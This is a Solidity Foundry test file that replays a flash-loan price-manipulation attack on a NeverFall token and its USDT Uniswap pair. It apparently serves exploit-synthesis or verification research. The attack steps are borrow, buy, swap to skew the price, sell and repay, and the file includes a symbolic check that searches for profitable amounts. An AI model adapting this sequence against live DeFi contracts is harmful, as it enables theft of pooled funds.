// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {NeverFall} from "./NeverFall.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract NeverFallTestBase is Test, BlockLoader {
    USDT usdt;
    NeverFall neverFall;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address neverFallAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1683045919;
    uint112 reserve0pair = 390749131999675869539950;
    uint112 reserve1pair = 177366502266430132318230923;
    uint32 blockTimestampLastpair = 1683045649;
    uint256 kLastpair = 69305797938101003734510187556035080952127678689650;
    uint256 price0CumulativeLastpair =
        11686512911925420079328798062310345871832946;
    uint256 price1CumulativeLastpair = 38487942699576719668303578652959368015;
    uint256 totalSupplyusdt = 3179997906401637314353419735;
    uint256 balanceOfusdtpair = 390749131999675869539950;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtneverFall = 10920;
    uint256 totalSupplyneverFall = 99900000000000000000000000000;
    uint256 balanceOfneverFallpair = 177366502266430132318230923;
    uint256 balanceOfneverFallattacker = 0;
    uint256 balanceOfneverFallneverFall = 99537303621642211235625620728;
    uint256 totalSupplypair = 8321500927629604090282341;
    uint256 balanceOfpairpair = 0;
    uint256 balanceOfpairattacker = 0;
    uint256 balanceOfpairneverFall = 8320140689525074913430188;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        neverFall = new NeverFall(address(usdt));
        neverFallAddr = address(neverFall);
        pair = new UniswapV2Pair(
            address(usdt),
            address(neverFall),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        pair.special_mint(balanceOfpairneverFall);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(neverFall), balanceOfusdtneverFall);
        neverFall.transfer(address(neverFall), balanceOfneverFallneverFall);
        pair.transfer(address(neverFall), balanceOfpairneverFall);
        usdt.transfer(address(pair), balanceOfusdtpair);
        neverFall.transfer(address(pair), balanceOfneverFallpair);
        neverFall.afterDeploy(address(router), address(pair));
        neverFall.setStartBuy();
        neverFall.transfer(address(neverFall), 99537303621642211235625620728);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(neverFall),
            address(usdt),
            neverFall.decimals()
        );
        queryERC20BalanceDecimals(
            address(pair),
            address(usdt),
            pair.decimals()
        );
        emit log_string("");
        emit log_string("Neverfall Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(neverFall),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(neverFall),
            address(neverFall),
            neverFall.decimals()
        );
        queryERC20BalanceDecimals(
            address(pair),
            address(neverFall),
            pair.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(neverFall),
            address(pair),
            neverFall.decimals()
        );
        queryERC20BalanceDecimals(
            address(pair),
            address(pair),
            pair.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(neverFall),
            address(attacker),
            neverFall.decimals()
        );
        queryERC20BalanceDecimals(
            address(pair),
            address(attacker),
            pair.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_neverFall_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        neverFall.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_neverFall_owner(uint256 amount) internal eurus {
        neverFall.transfer(owner, amount);
    }

    function borrow_pair_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        pair.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_owner(uint256 amount) internal eurus {
        pair.transfer(owner, amount);
    }

    function swap_pair_attacker_neverFall_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        neverFall.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function deposit_neverFall_usdt_neverFall(uint256 amount) internal eurus {
        IERC20(usdt).approve(address(neverFall), type(uint256).max);
        NeverFall(neverFall).buy(amount);
    }

    function withdraw_neverFall_neverFall_usdt(uint256 amount) internal eurus {
        IERC20(usdt).approve(address(neverFall), type(uint256).max);
        NeverFall(neverFall).sell(amount);
    }

    function swap_pair_attacker_usdt_neverFall(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(
            0,
            pair.getAmountOut(amount, address(usdt)),
            owner,
            new bytes(0)
        );
    }

    // function test_gt() public {
    //     vm.startPrank(attacker);
    //     emit log_named_uint("amt0", 1600000e18);
    //     borrow_usdt_owner(1600000e18);
    //     printBalance("After step0 ");
    //     emit log_named_uint("amt1", 200000 * 1e18);
    //     deposit_neverFall_usdt_neverFall(200000 * 1e18);
    //     printBalance("After step1 ");
    //     emit log_named_uint("amt2", 1300000 * 1e18);
    //     emit log_named_uint("amt3", 0);
    //     swap_pair_attacker_usdt_neverFall(1300000 * 1e18, 0);
    //     printBalance("After step2 ");
    //     emit log_named_uint("amt4", neverFall.balanceOf(attacker));
    //     withdraw_neverFall_neverFall_usdt(neverFall.balanceOf(attacker));
    //     printBalance("After step3 ");
    //     emit log_named_uint("amt5", 1600000e18);
    //     payback_usdt_owner(1600000e18);
    //     printBalance("After step4 ");
    //     require(attackGoal(), "Attack failed!");
    //     vm.stopPrank();
    // }

    function test_gt() public {
// uint256 amt0 = 0x1da43d518ddd810000000;
// uint256 amt1 = 0x50e26b190965f8000000;
// uint256 amt2 = 0x189615c1f1dbe70000000;
// uint256 amt3 = 0x67d3594207ddb000000000;
// // uint256 amt4 = 0x2deac5d50c6f5c00000000;
// uint256 amt5 = 0x1dbb011f4130e70000000;

// uint256 amt0 = 0xfc104c4e484838000000;
// uint256 amt1 = 0x69dbaff512dcb8000000;
// uint256 amt2 = 0x92349c4d894b20000000;
// uint256 amt3 = 0x92b6d15aaaf24800000000;
// uint256 amt4_1 = 0xbbb27f7997838000000000;
// // uint256 amt5 = 0xfcd1efc38b03d8000000;
uint256 amt0 = 0x1098e90f1e540d0000000;
uint256 amt1 = 0x5e189adb8164b4000000;
uint256 amt2 = 0xab75ecc9b98a40000000;
uint256 amt3 = 0x92b6d15aaaf24800000000;
uint256 amt4_1 = 0x9628637f45531000000000;
uint256 amt5 = 0x10a5a8f0f780650000000;
// uint256 amt0 = 0xd8a51ca65252c0000000;
// uint256 amt1 = 0x700bd0b7de3274000000;
// uint256 amt2 = 0x68994b4edbeb38000000;
// uint256 amt3 = 0x6cfcbb3d1a335400000000;
// uint256 amt4_1 = 0xa381374d1975e000000000;
// uint256 amt5 = 0xd94b7ec8b13d00000000;
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        printBalance("After step0 ");
        deposit_neverFall_usdt_neverFall(amt1);
        printBalance("After step1 ");
        emit log_named_decimal_uint("amt2", amt2, 18);
        emit log_named_decimal_uint("amt3", amt3, 18);
        
        emit log_named_decimal_uint("pair.totalSupply()", pair.totalSupply(), 18);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        printBalance("After step2 ");
        emit log_named_decimal_uint("amt4", amt4_1, 18);
        uint256 amt4 = neverFall.balanceOf(attacker) ;
        withdraw_neverFall_neverFall_usdt(amt4);
        printBalance("After step3 ");
        payback_usdt_owner(amt5);
        printBalance("After step4 ");
        vm.stopPrank();
    }


    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        deposit_neverFall_usdt_neverFall(amt1);
        swap_pair_attacker_usdt_neverFall(amt2, amt3);
        withdraw_neverFall_neverFall_usdt(amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
